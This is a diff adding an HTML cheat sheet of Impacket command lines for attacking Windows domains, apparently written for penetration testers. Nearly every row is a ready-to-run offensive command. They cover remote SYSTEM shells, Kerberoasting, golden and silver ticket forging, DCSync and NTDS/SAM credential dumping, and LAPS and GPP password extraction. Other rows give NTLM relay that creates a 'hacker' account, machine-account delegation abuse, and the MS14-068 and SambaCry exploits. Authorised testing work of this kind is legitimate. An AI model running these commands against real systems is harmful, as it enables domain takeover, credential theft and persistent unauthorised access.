@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Impacket Cheatsheet</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0e1117; color: #c9d1d9; font-family: 'IBM Plex Mono', monospace; font-size: 13px; padding: 32px; line-height: 1.6; }
+  h1 { color: #58a6ff; font-size: 18px; margin-bottom: 4px; }
+  .subtitle { color: #6e7681; font-size: 11px; margin-bottom: 28px; }
+  h2 { color: #f0883e; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; margin: 28px 0 10px; border-bottom: 1px solid #21262d; padding-bottom: 5px; }
+  table { width: 100%; border-collapse: collapse; }
+  tr:hover td { background: #161b22; }
+  td { padding: 5px 10px 5px 0; vertical-align: top; white-space: pre-wrap; word-break: break-all; border-bottom: 1px solid #161b22; }
+  td:first-child { color: #79c0ff; width: 200px; white-space: nowrap; padding-right: 20px; }
+  td:nth-child(2) { color: #e3b341; }
+  td:last-child { color: #6e7681; font-size: 11px; width: 220px; padding-left: 16px; }
+  .note { background: #161b22; border-left: 3px solid #58a6ff; padding: 10px 14px; margin-bottom: 20px; color: #8b949e; font-size: 11px; line-height: 1.8; }
+  .note b { color: #79c0ff; }
+</style>
+</head>
+<body>
+
+<h1>Impacket Cheatsheet</h1>
+<div class="subtitle">Kali Linux format — impacket-[tool] | all examples use DOMAIN/user:Pass@target</div>
+
+<div class="note">
+  <b>Auth flags (work on most tools):</b><br>
+  Password: <b>DOMAIN/user:Pass@target</b> &nbsp;|&nbsp;
+  Pass-the-Hash: <b>-hashes :NTHASH</b> &nbsp;|&nbsp;
+  Kerberos: <b>-k -no-pass</b> (set KRB5CCNAME first) &nbsp;|&nbsp;
+  AES key: <b>-aesKey HEX</b> &nbsp;|&nbsp;
+  DC: <b>-dc-ip 192.168.1.1</b>
+</div>
+
+<h2>Remote Execution</h2>
+<table>
+  <tr><td>impacket-psexec</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>SYSTEM shell via SVCManager (noisy)</td></tr>
+  <tr><td>impacket-wmiexec</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Shell via WMI, no binary drop</td></tr>
+  <tr><td>impacket-smbexec</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Shell via temp service, no upload</td></tr>
+  <tr><td>impacket-atexec</td><td>DOMAIN/user:Pass@192.168.1.10 "whoami"</td><td>Execute via Task Scheduler</td></tr>
+  <tr><td>impacket-dcomexec</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Shell via DCOM (MMC20 etc)</td></tr>
+</table>
+
+<h2>Kerberos Attacks</h2>
+<table>
+  <tr><td>impacket-GetUserSPNs</td><td>domain.local/user:Pass -dc-ip 192.168.1.1 -request -outputfile tgs.hash</td><td>Kerberoasting (crack: hashcat -m 13100)</td></tr>
+  <tr><td>impacket-GetNPUsers</td><td>domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip 192.168.1.1</td><td>AS-REP Roast (crack: hashcat -m 18200)</td></tr>
+  <tr><td>impacket-getTGT</td><td>domain.local/user:Pass</td><td>Request TGT, saves .ccache</td></tr>
+  <tr><td>impacket-getTGT</td><td>domain.local/user -hashes :NTHASH</td><td>Overpass-the-Hash / PTK</td></tr>
+  <tr><td>impacket-getST</td><td>-spn cifs/target.domain.local -impersonate Administrator domain.local/svc:Pass</td><td>S4U2self / constrained delegation</td></tr>
+  <tr><td>impacket-ticketer</td><td>-nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator</td><td>Forge Golden Ticket (TGT)</td></tr>
+  <tr><td>impacket-ticketer</td><td>-nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target Administrator</td><td>Forge Silver Ticket (TGS)</td></tr>
+  <tr><td>impacket-ticketConverter</td><td>ticket.kirbi ticket.ccache</td><td>Convert Mimikatz kirbi ↔ ccache</td></tr>
+  <tr><td>impacket-raiseChild</td><td>-target-exec 192.168.1.10 domain.local/childadmin:Pass</td><td>Child domain → forest DA escalation</td></tr>
+  <tr><td>impacket-keylistattack</td><td>-rodcNo 502 -rodcKey KEY domain.local/user:Pass@dc01</td><td>RODC KERB-KEY-LIST-REQ hash dump</td></tr>
+</table>
+
+<h2>Credential Dumping</h2>
+<table>
+  <tr><td>impacket-secretsdump</td><td>DOMAIN/Admin:Pass@192.168.1.1</td><td>DCSync — dumps all hashes from DC</td></tr>
+  <tr><td>impacket-secretsdump</td><td>DOMAIN/Admin:Pass@192.168.1.1 -just-dc-user krbtgt</td><td>DCSync single user</td></tr>
+  <tr><td>impacket-secretsdump</td><td>-sam SAM -system SYSTEM -security SECURITY local</td><td>Offline SAM/LSA from reg hives</td></tr>
+  <tr><td>impacket-secretsdump</td><td>-ntds ntds.dit -system SYSTEM local</td><td>Offline NTDS.dit dump</td></tr>
+  <tr><td>impacket-DumpNTLMInfo</td><td>192.168.1.10</td><td>NTLM info probe — no auth needed</td></tr>
+</table>
+
+<h2>SMB &amp; File Operations</h2>
+<table>
+  <tr><td>impacket-smbclient</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Interactive SMB shell (shares, get, put)</td></tr>
+  <tr><td>impacket-smbserver</td><td>share . -smb2support</td><td>Host current dir as SMB share</td></tr>
+  <tr><td>impacket-smbserver</td><td>share /opt/files -smb2support -username u -password p</td><td>Authenticated share</td></tr>
+  <tr><td>impacket-smbpasswd</td><td>DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td>Change/reset SMB password remotely</td></tr>
+</table>
+
+<h2>AD Enumeration</h2>
+<table>
+  <tr><td>impacket-GetADUsers</td><td>domain.local/user:Pass -dc-ip 192.168.1.1 -all</td><td>Enumerate all domain users</td></tr>
+  <tr><td>impacket-GetADComputers</td><td>domain.local/user:Pass -dc-ip 192.168.1.1 -resolveIP</td><td>Enumerate domain computers</td></tr>
+  <tr><td>impacket-GetLAPSPassword</td><td>domain.local/user:Pass -dc-ip 192.168.1.1</td><td>Dump LAPS passwords via LDAP</td></tr>
+  <tr><td>impacket-lookupsid</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>SID brute-force — enumerate users</td></tr>
+  <tr><td>impacket-samrdump</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Enumerate users/shares via SAMR</td></tr>
+  <tr><td>impacket-netview</td><td>domain.local/user:Pass -targets hosts.txt</td><td>Track active sessions across hosts</td></tr>
+  <tr><td>impacket-findDelegation</td><td>domain.local/user:Pass -dc-ip 192.168.1.1</td><td>List all delegation relationships</td></tr>
+  <tr><td>impacket-Get-GPPPassword</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Extract/decrypt GPP passwords</td></tr>
+</table>
+
+<h2>NTLM Relay</h2>
+<table>
+  <tr><td>impacket-ntlmrelayx</td><td>-tf targets.txt -smb2support</td><td>Relay to targets — auto SAM dump</td></tr>
+  <tr><td>impacket-ntlmrelayx</td><td>-tf targets.txt -smb2support -c "net user hacker P@ss /add"</td><td>Relay + execute command</td></tr>
+  <tr><td>impacket-ntlmrelayx</td><td>-tf targets.txt -smb2support -socks</td><td>Relay into SOCKS sessions</td></tr>
+  <tr><td>impacket-ntlmrelayx</td><td>-t ldap://192.168.1.1 -smb2support</td><td>Relay to LDAP</td></tr>
+  <tr><td>impacket-karmaSMB</td><td>/path/to/file.exe -smb2support</td><td>Serve arbitrary file for any UNC path</td></tr>
+</table>
+
+<h2>MSSQL</h2>
+<table>
+  <tr><td>impacket-mssqlclient</td><td>DOMAIN/user:Pass@192.168.1.10 -windows-auth</td><td>Windows auth login</td></tr>
+  <tr><td>impacket-mssqlclient</td><td>sa:Pass@192.168.1.10</td><td>SQL auth login</td></tr>
+  <tr><td>impacket-mssqlinstance</td><td>192.168.1.10</td><td>Discover MSSQL instance names</td></tr>
+</table>
+
+<h2>MSRPC / Registry / Services</h2>
+<table>
+  <tr><td>impacket-services</td><td>DOMAIN/user:Pass@192.168.1.10 list</td><td>List all Windows services</td></tr>
+  <tr><td>impacket-services</td><td>DOMAIN/user:Pass@192.168.1.10 start -name Spooler</td><td>start/stop/status/delete service</td></tr>
+  <tr><td>impacket-reg</td><td>DOMAIN/user:Pass@192.168.1.10 query -keyName "HKLM\SOFTWARE\..." -v ProductName</td><td>Remote registry read/write</td></tr>
+  <tr><td>impacket-rpcdump</td><td>192.168.1.10</td><td>Dump all RPC endpoints</td></tr>
+  <tr><td>impacket-rpcmap</td><td>ncacn_ip_tcp:192.168.1.10</td><td>Scan for listening DCE/RPC interfaces</td></tr>
+  <tr><td>impacket-ifmap</td><td>192.168.1.10 135</td><td>Enumerate DCERPC interfaces</td></tr>
+  <tr><td>impacket-opdump</td><td>192.168.1.10 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0</td><td>Dump ops for a specific interface</td></tr>
+  <tr><td>impacket-wmiquery</td><td>DOMAIN/user:Pass@192.168.1.10 -query "SELECT * FROM Win32_Process"</td><td>Run WQL query via WMI</td></tr>
+</table>
+
+<h2>AD Computer / RBCD</h2>
+<table>
+  <tr><td>impacket-addcomputer</td><td>domain.local/user:Pass -dc-ip 192.168.1.1 -computer-name EVIL$ -computer-pass P@ss1</td><td>Add machine account (RBCD abuse)</td></tr>
+  <tr><td>impacket-rbcd</td><td>-action write -delegate-to target$ -delegate-from evil$ DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td>Write msDS-AllowedToActOnBehalfOf</td></tr>
+  <tr><td>impacket-getArch</td><td>-target 192.168.1.10</td><td>Detect remote OS architecture</td></tr>
+  <tr><td>impacket-net</td><td>DOMAIN/user:Pass@192.168.1.10 user -list</td><td>Remote net.exe equivalent</td></tr>
+  <tr><td>impacket-changepasswd</td><td>DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td>Change/reset password (multi-protocol)</td></tr>
+  <tr><td>impacket-exchanger</td><td>domain.local/user:Pass@mail.domain.local nspi dump-tables -name GAL</td><td>Dump Exchange address book</td></tr>
+</table>
+
+<h2>Exploits</h2>
+<table>
+  <tr><td>impacket-goldenPac</td><td>domain.local/user:Pass@dc01.domain.local</td><td>MS14-068 Kerberos privesc</td></tr>
+  <tr><td>impacket-sambaPipe</td><td>-dc-ip 192.168.1.1 domain.local/user:Pass -so /path/to/payload.so</td><td>CVE-2017-7494 (SambaCry)</td></tr>
+  <tr><td>impacket-smbrelayx</td><td>-h victimIP -c "whoami"</td><td>CVE-2015-0005 SMB relay</td></tr>
+</table>
+
+<h2>Offline / File Format Tools</h2>
+<table>
+  <tr><td>impacket-secretsdump</td><td>-ntds ntds.dit -system SYSTEM local</td><td>Parse NTDS.dit offline</td></tr>
+  <tr><td>impacket-esentutl</td><td>ntds.dit dump -table datatable</td><td>Parse ESE/JET database</td></tr>
+  <tr><td>impacket-ntfs-read</td><td>"\C:" -extract "\windows\system32\config\sam"</td><td>Extract files from NTFS volume</td></tr>
+  <tr><td>impacket-registry-read</td><td>SYSTEM walk</td><td>Parse offline registry hive</td></tr>
+</table>
+
+<h2>Misc / Checks</h2>
+<table>
+  <tr><td>impacket-rdp_check</td><td>DOMAIN/user:Pass@192.168.1.10</td><td>Validate creds via RDP/CredSSP</td></tr>
+  <tr><td>impacket-mqtt_check</td><td>domain/user:Pass@192.168.1.10</td><td>MQTT login check</td></tr>
+  <tr><td>impacket-ping6</td><td>192.168.1.10</td><td>IPv6 echo probe</td></tr>
+</table>
+
+</body>
+</html>
